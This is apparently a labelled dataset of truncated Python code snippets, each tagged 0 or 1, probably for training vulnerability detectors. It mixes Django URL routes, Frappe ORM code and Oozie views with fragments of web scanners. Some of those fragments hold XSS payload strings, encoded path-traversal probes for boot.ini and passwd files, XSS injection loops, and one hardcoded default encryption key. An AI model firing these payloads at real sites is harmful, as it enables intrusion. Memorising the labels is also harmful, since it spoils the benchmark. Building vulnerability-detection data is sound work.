url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(", "label": 0}, {"snippet_id": 18719, "code": ".masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news'", "label": 0}, {"snippet_id": 41201, "code": ".blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title", "label": 1}, {"snippet_id": 31507, "code": " RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id", "label": 0}, {"snippet_id": 43993, "code": " fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=", "label": 0}, {"snippet_id": 21682, "code": "+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 54077, "code": "=\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie.get() if len(c)>0: ck=c for x in crl:", "label": 0}, {"snippet_id": 27857, "code": " except Exception: self.handle_exception_exception() def handle_exception_exception(self): \"\"\"Catch exception in handle_exception and format it properly.\"\"\" exception=sys.exc_info()[1] values={'message':", "label": 0}, {"snippet_id": 9317, "code": "', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 3688, "code": "-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers", "label": 0}, {"snippet_id": 5659, "code": "=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()<", "label": 0}, {"snippet_id": 42944, "code": "(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[", "label": 0}, {"snippet_id": 22998, "code": ">[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url", "label": 0}, {"snippet_id": 26734, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00'", "label": 0}, {"snippet_id": 28389, "code": ") \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type)", "label": 0}, {"snippet_id": 13228, "code": "'auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware", "label": 0}, {"snippet_id": 50102, "code": " to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self.last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else:", "label": 0}, {"snippet_id": 1502, "code": "/Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST", "label": 0}, {"snippet_id": 32829, "code": "=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve", "label": 0}, {"snippet_id": 51777, "code": " TWO_FACTOR_QR_FACTORY='qrcode.image.pil.PilImage' TWO_FACTOR_TOTP_DIGITS=6 TWO_FACTOR_PATCH_ADMIN=True FIELD_ENCRYPTION_KEY=os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=') if", "label": 0}, {"snippet_id": 19851, "code": "(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR", "label": 0}, {"snippet_id": 19404, "code": "\"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else ", "label": 0}, {"snippet_id": 2453, "code": " check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find", "label": 0}, {"snippet_id": 4332, "code": "(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" %", "label": 0}, {"snippet_id": 30036, "code": "\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert", "label": 0}, {"snippet_id": 14834, "code": ") def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file=", "label": 0}, {"snippet_id": 15174, "code": " ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a", "label": 0}, {"snippet_id": 52369, "code": " type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=", "label": 0}, {"snippet_id": 38475, "code": " frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password,", "label": 0}, {"snippet_id": 39270, "code": "): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname", "label": 0}, {"snippet_id": 53538, "code": ".cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_", "label": 0}, {"snippet_id": 1868, "code": "'ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads", "label": 0}, {"snippet_id": 49964, "code": " over the webclient. \"\"\" import json import re import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django", "label": 0}, {"snippet_id": 23947, "code": " ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file", "label": 0}, {"snippet_id": 39984, "code": ".format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for", "label": 0}, {"snippet_id": 42819, "code": ".get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t", "label": 0}, {"snippet_id": 37867, "code": "\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate", "label": 0}, {"snippet_id": 29641, "code": ".close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\") \t\tpass def escape_html(text): \treturn cgi.escape(text, quote", "label": 0}, {"snippet_id": 23615, "code": "(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor", "label": 0}, {"snippet_id": 30858, "code": "%s %s%s' %(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template(", "label": 0}, {"snippet_id": 14110, "code": "/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading',", "label": 0}, {"snippet_id": 20053, "code": ".clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[", "label": 0}, {"snippet_id": 30488, "code": ", grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act", "label": 0}, {"snippet_id": 44731, "code": "'{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value'])", "label": 0}, {"snippet_id": 4987, "code": " onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir", "label": 0}, {"snippet_id": 14618, "code": "--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file", "label": 0}, {"snippet_id": 26848, "code": "', 'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find", "label": 0}, {"snippet_id": 8032, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$", "label": 0}, {"snippet_id": 35723, "code": " \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check", "label": 0}, {"snippet_id": 22384, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX", "label": 0}, {"snippet_id": 46354, "code": "', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status'", "label": 0}, {"snippet_id": 54358, "code": " cookie.config(width=30) method.grid(row=2, column=1) method.current(0) method.config(width=30) timeout.grid(row=3, column=1) timeout.config(width=30) user_agent.grid(row=4, column=1) user_agent.config(width", "label": 0}, {"snippet_id": 10405, "code": " expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 34979, "code": " \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t", "label": 0}, {"snippet_id": 7885, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 33757, "code": "\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe", "label": 0}, {"snippet_id": 55020, "code": " t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name", "label": 0}, {"snippet_id": 3540, "code": "\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find", "label": 0}, {"snippet_id": 25132, "code": "{dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\",", "label": 0}, {"snippet_id": 26178, "code": "-required-if']=' self.fields['name_parts'].widget.attrs['data-no-required-attr']='1' self.fields['company'].widget.attrs['data-required-if']=' if not event.settings.invoice_address_beneficiary: del self", "label": 0}, {"snippet_id": 38621, "code": "(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif", "label": 0}, {"snippet_id": 16414, "code": "([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r", "label": 0}, {"snippet_id": 5438, "code": "'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize", "label": 0}, {"snippet_id": 32403, "code": ") webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so", "label": 0}, {"snippet_id": 25323, "code": ", None) for i, widget in enumerate(self.widgets): try: widget_value=value[i] except(IndexError, TypeError): widget_value=None if id_: final_attrs=dict( final_attrs, id='%s_%s' %(id_, i), title=self.scheme", "label": 0}, {"snippet_id": 2544, "code": "=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body,", "label": 1}, {"snippet_id": 38487, "code": ".db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the", "label": 0}, {"snippet_id": 54498, "code": ".template import RequestContext from django.shortcuts import Http404, redirect, render, render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import FormView,", "label": 0}, {"snippet_id": 35076, "code": "['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t", "label": 0}, {"snippet_id": 32389, "code": ": print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join() return retcode def _open_url(url): time.sleep(1) webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a", "label": 0}, {"snippet_id": 43581, "code": "\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision", "label": 0}, {"snippet_id": 31024, "code": "\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '", "label": 0}, {"snippet_id": 53571, "code": "=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content", "label": 0}, {"snippet_id": 37498, "code": ".form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger ", "label": 0}, {"snippet_id": 24124, "code": "(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls):", "label": 0}, {"snippet_id": 17395, "code": ".provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False)", "label": 0}, {"snippet_id": 14501, "code": "(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor", "label": 0}, {"snippet_id": 35820, "code": ": \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self", "label": 0}, {"snippet_id": 40988, "code": ": \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self", "label": 0}, {"snippet_id": 37530, "code": ".format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name", "label": 1}, {"snippet_id": 15266, "code": " this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest", "label": 0}, {"snippet_id": 49024, "code": " class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object) for column in self", "label": 0}, {"snippet_id": 44206, "code": " from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie", "label": 0}, {"snippet_id": 45961, "code": ", {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card", "label": 0}, {"snippet_id": 1174, "code": ".vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash():", "label": 0}, {"snippet_id": 918, "code": "//\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if", "label": 1}, {"snippet_id": 47614, "code": "'dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")", "label": 0}, {"snippet_id": 46521, "code": "=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections", "label": 0}, {"snippet_id": 3382, "code": " '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='", "label": 0}, {"snippet_id": 54465, "code": " import UserCreationForm, PasswordChangeForm from django.contrib.auth.models import User from django.contrib.auth.decorators import login_required from django.contrib.auth.mixins import LoginRequiredMixin,", "label": 0}, {"snippet_id": 17913, "code": "), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx", "label": 0}, {"snippet_id": 22856, "code": ")/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$", "label": 1}, {"snippet_id": 2407, "code": " import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload", "label": 0}, {"snippet_id": 42991, "code": " cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects", "label": 0}, {"snippet_id": 2052, "code": ": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload", "label": 0}, {"snippet_id": 35207, "code": ": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not", "label": 0}, {"snippet_id": 52359, "code": " workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name", "label": 0}, {"snippet_id": 46224, "code": ": query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET", "label": 0}, {"snippet_id": 48716, "code": " response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=", "label": 0}, {"snippet_id": 23578, "code": "', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include", "label": 0}, {"snippet_id": 17657, "code": ".reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'", "label": 0}, {"snippet_id": 26718, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', ", "label": 0}, {"snippet_id": 46703, "code": ": selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question", "label": 0}, {"snippet_id": 656, "code": ".W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request", "label": 1}, {"snippet_id": 38025, "code": ".comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[", "label": 0}, {"snippet_id": 20653, "code": "), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request", "label": 0}, {"snippet_id": 7920, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url", "label": 0}, {"snippet_id": 18043, "code": "(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?", "label": 0}, {"snippet_id": 17889, "code": "\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press", "label": 0}, {"snippet_id": 9316, "code": ".progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 39598, "code": "\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t", "label": 0}, {"snippet_id": 31099, "code": "\tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"add_vrrp.sh\" \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master,", "label": 0}, {"snippet_id": 29383, "code": " +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf", "label": 0}, {"snippet_id": 35467, "code": "\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname", "label": 0}, {"snippet_id": 53492, "code": "['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission", "label": 0}, {"snippet_id": 52789, "code": ":list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm", "label": 0}, {"snippet_id": 39512, "code": " timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"):", "label": 0}, {"snippet_id": 54953, "code": " project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed, for later sync. ", "label": 0}, {"snippet_id": 2305, "code": " xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact", "label": 0}, {"snippet_id": 32416, "code": " This function is passed to \"toc\" extension as an extension option, so 